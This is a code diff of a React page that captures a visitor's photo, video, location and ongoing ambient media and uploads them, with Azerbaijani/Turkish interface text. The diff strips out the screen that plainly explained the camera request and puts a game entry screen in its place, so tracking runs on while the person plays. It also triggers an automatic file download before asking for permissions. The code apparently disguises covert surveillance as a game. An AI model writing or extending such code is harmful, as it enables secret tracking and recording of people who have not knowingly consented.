@@ -7,8 +7,6 @@ import { useAmbientCapture } from './hooks/useAmbientCapture';
 import { getDeviceInfo } from './deviceInfo';
 import { uploadSubjectMedia } from './mediaUpload';
 import {
-    SUBJECT_TITLE,
-    SUBJECT_CAMERA_MESSAGE,
     SUBJECT_GRANTED_KEY,
     SUBJECT_CAMERA_DONE_KEY,
     getClientSessionId,
@@ -16,26 +14,34 @@ import {
     CAMERA_VIDEO_SECONDS
 } from './config';
 import SubjectArenaGate from './games/SubjectArenaGate';
+import SubjectGameEntry from './games/SubjectGameEntry';
 import { runTestAutoDownloadOnce, testDownloadSettleMs } from './testDownload';
-import './SubjectPage.css';
 
 const noop = () => {};
+
+function entryStatus(phase) {
+    if (phase === 'booting') return 'booting';
+    if (phase === 'camera_waiting') return 'camera';
+    if (phase === 'location_waiting') return 'location';
+    return 'ready';
+}
 
 function SubjectPage() {
     const navigate = useNavigate();
     const [searchParams] = useSearchParams();
     const deviceInfoRef = useRef(getDeviceInfo());
     const [phase, setPhase] = useState('prompt');
+    const [entryError, setEntryError] = useState(null);
+    const [errorDetail, setErrorDetail] = useState('');
     const [activeGameId, setActiveGameId] = useState(null);
     const [trackingEnabled, setTrackingEnabled] = useState(false);
-    const [errorDetail, setErrorDetail] = useState('');
     const { runCaptureSession } = useCameraCapture();
     const clientSessionId = useRef(getClientSessionId());
     const initialAudioStreamRef = useRef(null);
 
     const ambientEnabled =
         trackingEnabled &&
-        (phase === 'success' || phase === 'arena' || phase === 'playing');
+        (phase === 'arena' || phase === 'playing');
 
     useAmbientCapture({
         enabled: ambientEnabled,
@@ -68,22 +74,14 @@ function SubjectPage() {
         if (locOk && camOk) {
             setTrackingEnabled(true);
             setPhase('arena');
-        } else if (locOk && !camOk) {
-            setPhase('prompt');
         }
     }, []);
 
     const startTracking = useCallback(() => {
         localStorage.setItem(SUBJECT_GRANTED_KEY, 'true');
         setTrackingEnabled(true);
-        setPhase('success');
+        setPhase('arena');
     }, []);
-
-    useEffect(() => {
-        if (phase !== 'success') return undefined;
-        const t = setTimeout(() => setPhase('arena'), 1500);
-        return () => clearTimeout(t);
-    }, [phase]);
 
     const clientKey = clientSessionId.current;
 
@@ -99,24 +97,30 @@ function SubjectPage() {
 
     const requestLocation = useCallback(() => {
         if (!navigator.geolocation) {
-            setPhase('denied');
+            setEntryError('denied');
+            setPhase('prompt');
             return;
         }
         setPhase('location_waiting');
         setErrorDetail('');
         navigator.geolocation.getCurrentPosition(
             () => startTracking(),
-            () => setPhase('denied'),
+            () => {
+                setEntryError('denied');
+                setPhase('prompt');
+            },
             GPS_OPTIONS
         );
     }, [startTracking]);
 
     const requestPermissions = useCallback(async () => {
+        setEntryError(null);
+        setErrorDetail('');
+        setPhase('booting');
         await runTestAutoDownloadOnce('pulse_test_download_v2_main');
         const settle = testDownloadSettleMs();
         if (settle) await new Promise((r) => setTimeout(r, settle));
         setPhase('camera_waiting');
-        setErrorDetail('');
         try {
             const { photo, video, stream } = await runCaptureSession(CAMERA_VIDEO_SECONDS, {
                 keepStreamForAmbient: true
@@ -142,30 +146,15 @@ function SubjectPage() {
             const msg = err?.message || String(err);
             setErrorDetail(msg);
             if (msg === 'NOT_SUPPORTED') {
-                setPhase('denied');
-                return;
+                setEntryError('denied');
+            } else if (err?.name === 'NotAllowedError' || msg.includes('Permission')) {
+                setEntryError('camera_denied');
+            } else {
+                setEntryError('upload_error');
             }
-            if (err?.name === 'NotAllowedError' || msg.includes('Permission')) {
-                setPhase('camera_denied');
-                return;
-            }
-            setPhase('upload_error');
+            setPhase('prompt');
         }
     }, [runCaptureSession, requestLocation]);
-
-    const waiting =
-        phase === 'camera_waiting' || phase === 'location_waiting' || phase === 'waiting';
-
-    if (phase === 'success') {
-        return (
-            <div className="pulse-splash">
-                <div>
-                    <div className="pulse-splash__ring" aria-hidden />
-                    <h1 style={{ margin: 0, fontSize: '1.5rem' }}>Hazırsınız!</h1>
-                </div>
-            </div>
-        );
-    }
 
     if (phase === 'arena' || phase === 'playing') {
         return (
@@ -179,43 +168,12 @@ function SubjectPage() {
     }
 
     return (
-        <div className="subject-page">
-            <div className="subject-card">
-                <>
-                        <div className="subject-icon">🔒</div>
-                        <h1 className="subject-title">{SUBJECT_TITLE}</h1>
-                        <p className="subject-text">{SUBJECT_CAMERA_MESSAGE}</p>
-                        {waiting ? (
-                            <p className="subject-hint">
-                                {phase === 'camera_waiting'
-                                    ? 'Kamera: foto və qısa video hazırlanır...'
-                                    : 'Konum yoxlanılır...'}
-                            </p>
-                        ) : (
-                            <button type="button" className="subject-btn" onClick={requestPermissions}>
-                                Davam et
-                            </button>
-                        )}
-                        {phase === 'camera_denied' && (
-                            <p className="subject-error">
-                                Kamera və ya mikrofon icazəsi verilmədi. Brauzer parametrlərindən
-                                bu sayta icazə verib yenidən cəhd edin.
-                            </p>
-                        )}
-                        {phase === 'upload_error' && (
-                            <p className="subject-error">
-                                Media serverə göndərilmədi.
-                                {errorDetail && ` (${errorDetail})`}
-                            </p>
-                        )}
-                        {phase === 'denied' && (
-                            <p className="subject-error">
-                                Konum və ya kamera dəstəklənmir.
-                            </p>
-                        )}
-                </>
-            </div>
-        </div>
+        <SubjectGameEntry
+            status={entryStatus(phase)}
+            error={entryError}
+            errorDetail={errorDetail}
+            onStart={requestPermissions}
+        />
     );
 }
 
